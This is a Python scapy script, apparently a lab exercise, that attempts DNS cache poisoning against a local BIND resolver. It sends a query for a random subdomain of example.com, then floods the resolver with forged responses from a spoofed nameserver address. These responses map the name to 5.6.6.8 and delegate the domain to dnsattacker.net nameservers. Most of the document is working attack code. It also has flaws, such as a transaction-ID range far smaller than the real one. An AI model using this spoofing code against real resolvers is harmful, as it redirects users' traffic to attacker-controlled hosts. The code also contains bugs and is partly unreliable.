#!/usr/bin/env python
import argparse
import socket

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP
from random import randint, choice
from string import ascii_lowercase, digits

SPROOF_ADDR = "5.6.6.8"
SPROOF_NS_1 = "ns1.dnsattacker.net"
SPROOF_NS_2 = "ns2.dnsattacker.net"

DNS_HOSTS = {
    b"example.com.": "5.6.6.8",
}

parser = argparse.ArgumentParser()
parser.add_argument(
    "--dns_port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument(
    "--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()


# BIND's addr
DNS_ADDR = "127.0.0.1"
# your bind's port (DNS queries are send to this port)
DNS_PORT = args.dns_port #6060

# port that your bind uses to send its DNS queries
my_query_port = args.query_port #5055

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
    return ''.join(choice(ascii_lowercase + digits) for _ in range(10))

DOMAIN_NAME = getRandomSubDomain() + '.example.com.'

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
    return randint(0, 256)


'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))  #bytes(packet)


'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    
    dnsPacket = DNS(rd=1, qd=DNSQR(qname=DOMAIN_NAME))
    sendPacket(sock, dnsPacket, DNS_ADDR, DNS_PORT)
    # response = sock.recvfrom(4096)
    # response = DNS(response)
    # print("\n***** Packet Received from Remote Server *****")
    # response.show()
    # print("***** End of Remote Server Packet *****\n")

if __name__ == '__main__':

    # construct a response packet
    Qdsec = DNSQR(qname=DOMAIN_NAME)
    Anssec = DNSRR(rrname=DOMAIN_NAME, type='A', rdata='5.6.6.8', ttl=259200)
    dns = DNS(id=getRandomTXID(), aa=1, rd=0, qr=1,
                                  qcount=1, ancount=1, nscount=2, arcount=1,
                                  qd=Qdsec, an=Anssec,
                                  ns=DNSRR(rrname="example.com.", rclass=1, rdata=SPROOF_NS_1, type='NS')/DNSRR(rrname=DOMAIN_NAME, type='NS', rdata=SPROOF_NS_2) )
    ip = IP(dst=DNS_ADDR, src="199.43.135.53", chksum=0)
    udp = UDP(dport=my_query_port, sport=53, chksum=0)
    response = ip/udp/dns

    # response =  IP(dst=DNS_ADDR, src="199.43.135.53")/ \
    #             UDP(sport=53, dport=my_query_port)/ \
    #             DNS(id=getRandomTXID(), qr=1, rd=1, ra=1, aa=1, qdcount=1, ancount=1, nscount=2, arcount=0, 
    #                 qd=DNSQR(qname=DOMAIN_NAME, qtype=1, qclass=1), 
    #                 an=DNSRR(rrname=DOMAIN_NAME, rdata=SPROOF_ADDR, type='A'),
    #                 ns=DNSRR(rrname="example.com", rclass=1, rdata=SPROOF_NS_1, type='NS')/DNSRR(rrname=DOMAIN_NAME, type='NS', rdata=SPROOF_NS_2)
    #             )
    response.show()

    # send the dns query
    exampleSendDNSQuery()

    dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    for _ in range(50):
		# TXID
        response.getlayer(DNS).id = getRandomTXID()
		# # len and chksum
        # response.getlayer(UDP).len = IP(str(response)).len-20
        # response[UDP].post_build(str(response[UDP]), str(response[UDP].payload))
        sendPacket(dns_sock, response, DNS_ADDR, my_query_port)
